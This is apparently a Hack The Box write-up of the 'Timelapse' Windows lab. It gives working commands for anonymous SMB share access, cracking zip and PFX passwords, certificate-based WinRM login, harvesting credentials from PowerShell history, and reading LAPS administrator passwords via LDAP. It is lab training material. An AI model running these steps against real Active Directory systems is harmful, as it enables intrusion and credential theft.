**Author:** Faridd

# HTB Write-Up: Timelapse

| Field      | Details                                                          |
|------------|-------------------------------------------------------------------|
| Platform   | Hack The Box                                                     |
| Difficulty | Easy                                                             |
| OS         | Windows                                                          |
| Date       | October 31, 2026                                                 |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — Anonymous SMB Share Access](#2-enumeration--anonymous-smb-share-access)
3. [Initial Access — Cracking a Protected PFX & Certificate-Based WinRM Auth](#3-initial-access--cracking-a-protected-pfx--certificate-based-winrm-auth)
4. [Lateral Movement — PowerShell History Credential Leak](#4-lateral-movement--powershell-history-credential-leak)
5. [Privilege Escalation — LAPS Readers Group to Local Admin Password](#5-privilege-escalation--laps-readers-group-to-local-admin-password)

---

## 1. Reconnaissance

Port discovery was performed with **RustScan**:

```bash
rustscan -a 10.129.227.113 --ulimit=5000
```

**Open Ports:**

| Port | Service        |
|------|----------------|
| 53   | DNS            |
| 88   | Kerberos       |
| 135  | MSRPC          |
| 139  | NetBIOS        |
| 389  | LDAP           |
| 445  | SMB            |
| 464  | kpasswd        |
| 593  | HTTP-RPC       |
| 636  | LDAPS          |
| 3268 | Global Catalog |
| 3269 | Global Catalog (SSL) |
| 5986 | WinRM over HTTPS |
| 9389 | AD Web Services|

The port list confirms a **Domain Controller**, domain `timelapse.htb`, hostname `DC01`. Notably, only **5986** (WinRM over HTTPS) is open — the plain WinRM port **5985 is closed**, meaning any later WinRM connection must use SSL.

---

## 2. Enumeration — Anonymous SMB Share Access

### 2.1 — Guest Share Listing

```bash
netexec smb 10.129.227.113 -u "guest" -p "" --shares
```

```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON                        Logon server share
Shares          READ            
SYSVOL                          Logon server share
```

The custom **`Shares`** share is readable with no credentials.

### 2.2 — Browsing the Shares Share

```bash
smbclient //10.129.227.113/Shares --user=guest --password=''
recurse on
ls
```

```
\Dev
  winrm_backup.zip

\HelpDesk
  LAPS.x64.msi
  LAPS_Datasheet.docx
  LAPS_OperationsGuide.docx
  LAPS_TechnicalSpecification.docx
```

Two things stand out immediately: a **WinRM backup archive**, and a full set of **LAPS** (Local Administrator Password Solution) documentation and installer — LAPS being relevant later once a foothold is gained. The backup archive was pulled down first:

```bash
cd Dev
get winrm_backup.zip
```

---

## 3. Initial Access — Cracking a Protected PFX & Certificate-Based WinRM Auth

### 3.1 — Unzipping the Backup

```bash
unzip winrm_backup.zip
```

```
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
skipping: legacyy_dev_auth.pfx    incorrect password
```

The archive itself is password-protected, so it had to be cracked before the `.pfx` inside could even be extracted.

### 3.2 — Cracking the Zip Password

```bash
zip2john winrm_backup.zip > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:** zip password `supremelegacy`.

```bash
unzip winrm_backup.zip
# password: supremelegacy
# inflating: legacyy_dev_auth.pfx
```

### 3.3 — Why a .pfx Matters Here: Certificate-Based WinRM Authentication

The earlier recon noted that only **5986 (WinRM over HTTPS)** was open. WinRM normally authenticates with a username and password, but when running over HTTPS it can alternatively be configured to accept **certificate-based authentication** — instead of a password, the client presents a valid client certificate and proves it holds the matching private key, and the server maps that certificate to a specific domain user.

A `.pfx` (PKCS#12) file is a single encrypted container that bundles exactly the two pieces needed for that proof:

1. **The certificate (`.crt`)** — the public half, which states an identity ("this is the user `legacyy`").
2. **The private key (`.key`)** — the secret half, which proves the holder actually owns that identity. Without it, the certificate alone is useless for authentication.

`legacyy_dev_auth.pfx` is exactly this: a developer's WinRM client-authentication identity, backed up into a zip and left on an SMB share. Since the container itself is encrypted with its own separate password, it first had to be cracked before the certificate and key could be split out and handed to an SSH/WinRM-style client for impersonation.

### 3.4 — Cracking the PFX Password

```bash
openssl pkcs12 -info -in legacyy_dev_auth.pfx
# Enter Import Password: (unknown)
```

```bash
john hash1 --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:** PFX password `thuglegacy`.

### 3.5 — Extracting the Certificate and Private Key

With the PFX password known, the certificate and key were split out of the container using OpenSSL:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy.key -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy.crt
```

### 3.6 — Authenticating to WinRM with the Certificate

```bash
evil-winrm -i 10.129.227.113 -c legacyy.crt -k legacyy.key -S
```

The `-S` flag tells Evil-WinRM to connect over SSL (port 5986), which is required since plain WinRM (5985) is not open on this host. The certificate and key stand in for a username/password entirely — the server authenticates the session as `legacyy` purely from the proof-of-possession of that private key.

```
*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
96892b57c24dd61f73453581b019da85
```

---

## 4. Lateral Movement — PowerShell History Credential Leak

### 4.1 — Reading PSReadLine History

PowerShell persists a user's command history to disk by default via the **PSReadLine** module, independent of the current session — a common place to find credentials pasted into prior commands:

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
```

A plaintext password for the `svc_deploy` account was sitting in `legacyy`'s command history.

### 4.2 — Shell as svc_deploy

```bash
evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

Again, `-S` is required since only the SSL WinRM port is open on this box.

---

## 5. Privilege Escalation — LAPS Readers Group to Local Admin Password

### 5.1 — Checking Group Membership

```powershell
whoami /all
```

```
TIMELAPSE\LAPS_Readers    Group    Mandatory group, Enabled by default, Enabled group
```

`svc_deploy` is a member of **LAPS_Readers**.

### 5.2 — What LAPS Readers Grants

**LAPS** (Local Administrator Password Solution) is Microsoft's mechanism for automatically randomizing and rotating each domain machine's local Administrator password, storing the current plaintext value in a protected AD computer-object attribute, **`ms-Mcs-AdmPwd`**. Normal domain users cannot read that attribute, but AD administrators can delegate **read** access to it to a specific group — which is exactly what `LAPS_Readers` grants its members: the ability to query any computer object in the domain and retrieve its current local Administrator password in cleartext.

### 5.3 — Querying the LAPS Password

```powershell
$searcher = [ADSISearcher]"(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))"
$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        Computer = $_.Properties.name[0]
        Password = $_.Properties.'ms-mcs-admpwd'[0]
    }
}
```

```
Computer Password
-------- --------
DC01     /P(844YhSH}$8j[r0y,6{$W9
```

This LDAP filter searches for every computer object that has a non-empty `ms-Mcs-AdmPwd` attribute and prints its current value — directly handing over the Domain Controller's local **Administrator** password.

### 5.4 — Administrator Access & Root Flag

```bash
evil-winrm -i 10.129.227.113 -u Administrator -p '/P(844YhSH}$8j[r0y,6{$W9' -S
```

The root flag was not on the Administrator's own desktop, but on a separate `TRX` user's desktop:

```powershell
cd C:\Users\TRX\Desktop
type root.txt
# e109b4592e591774c1ab95f8bddebc93
```
